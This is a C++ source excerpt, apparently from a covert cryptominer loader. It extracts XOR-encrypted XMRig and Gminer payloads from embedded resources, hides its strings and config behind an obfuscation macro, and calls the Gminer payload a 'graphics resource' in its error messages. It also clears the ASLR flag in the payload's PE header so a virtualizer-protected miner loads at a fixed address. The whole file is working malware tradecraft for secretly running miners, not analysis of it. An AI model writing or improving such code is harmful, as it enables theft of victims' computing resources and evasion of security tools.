// Clear IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE (0x40) on a loaded PE image in memory.
// The protected payload keeps baked-in absolute addresses in its virtualizer
// sections (.NotHid/.fptable/.pack) which are NOT covered by the .reloc table
// (only .rdata/.data are). When the memory manager honors the ASLR flag during
// NtMapViewOfSection it randomizes the load address and relocates the image;
// the stale virtualizer pointers then make the VM abort with STATUS_SINGLE_STEP
// (0x80000004). With the flag cleared the image is mapped at its preferred
// ImageBase and no relocation is ever applied.
static inline void PatchDisablePayloadAslr(BYTE* p, size_t size)
{
    if (!p || size < 0x400) return;
    if (p[0] != 'M' || p[1] != 'Z') return;

    DWORD e_lfanew = 0;
    memcpy(&e_lfanew, p + 0x3C, sizeof(e_lfanew));
    if (e_lfanew == 0 || e_lfanew + 0x5C >= size) return;
    if (memcmp(p + e_lfanew, "PE\0\0", 4) != 0) return;

    BYTE* opt = p + e_lfanew + 4 + 20; // NT headers + COFF header -> OptionalHeader
    WORD magic = 0;
    memcpy(&magic, opt, sizeof(magic));
    if (magic != 0x10b && magic != 0x20b) return; // PE32 / PE32+

    // DllCharacteristics is at offset 0x46 inside the OptionalHeader for both.
    WORD dllChar = 0;
    memcpy(&dllChar, opt + 0x46, sizeof(dllChar));
    dllChar &= ~(WORD)0x0040;                    // IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
    memcpy(opt + 0x46, &dllChar, sizeof(dllChar));
}

void LoadEmbeddedXMRig(BYTE*& payloadBuf, size_t& payloadSize) {
    HMODULE hModule = GetModuleHandle(nullptr);
    if (!hModule) throw std::runtime_error("Failed to get module handle.");

    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(EMBEDDED_XMRIG), RT_RCDATA);
    if (!hRes) { const char* e = DVM_STR("Failed to find miner resource."); throw std::runtime_error(e); }

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) { const char* e = DVM_STR("Failed to load miner resource."); throw std::runtime_error(e); }

    LPVOID pData = LockResource(hResData);
    if (!pData) { const char* e = DVM_STR("Failed to lock miner resource."); throw std::runtime_error(e); }

    DWORD size = SizeofResource(hModule, hRes);
    if (size == 0) { const char* e = DVM_STR("Miner resource size is zero."); throw std::runtime_error(e); }

    payloadBuf = new BYTE[size];
    memcpy(payloadBuf, pData, size);
    payloadSize = static_cast<size_t>(size);
    PayloadCryptoXor(payloadBuf, payloadSize);
    PatchDisablePayloadAslr(payloadBuf, payloadSize);
}

void LoadEmbeddedGminer(BYTE*& payloadBuf, size_t& payloadSize) {
    HMODULE hModule = GetModuleHandle(nullptr);
    if (!hModule) throw std::runtime_error("Failed to get module handle.");

    HRSRC hRes = FindResource(hModule, MAKEINTRESOURCE(EMBEDDED_GMINER), RT_RCDATA);
    if (!hRes) { const char* e = DVM_STR("Failed to locate graphics resource."); throw std::runtime_error(e); }

    HGLOBAL hResData = LoadResource(hModule, hRes);
    if (!hResData) { const char* e = DVM_STR("Failed to load graphics resource."); throw std::runtime_error(e); }

    LPVOID pData = LockResource(hResData);
    if (!pData) { const char* e = DVM_STR("Failed to lock graphics resource."); throw std::runtime_error(e); }

    DWORD size = SizeofResource(hModule, hRes);
    if (size == 0) { const char* e = DVM_STR("Graphics resource size is zero."); throw std::runtime_error(e); }

    payloadBuf = new BYTE[size];
    memcpy(payloadBuf, pData, size);
    payloadSize = static_cast<size_t>(size);
    PayloadCryptoXor(payloadBuf, payloadSize);
}

// The header is generated by CMake from embedded_config.json
inline std::string LoadEmbeddedConfig() {
#ifdef ENABLE_EMBEDDED_CONFIG
    // Return the deobfuscated config string (EMBEDDED_CONFIG_LITERAL is from embedded_config_generated.h)
    const char* cfg = DVM_STR(EMBEDDED_CONFIG_LITERAL);
    std::string out(cfg);
    DVM_FREE(cfg);
    return out;
#else
    throw std::runtime_error("Embedded config is not enabled at compile time.");
#endif
}
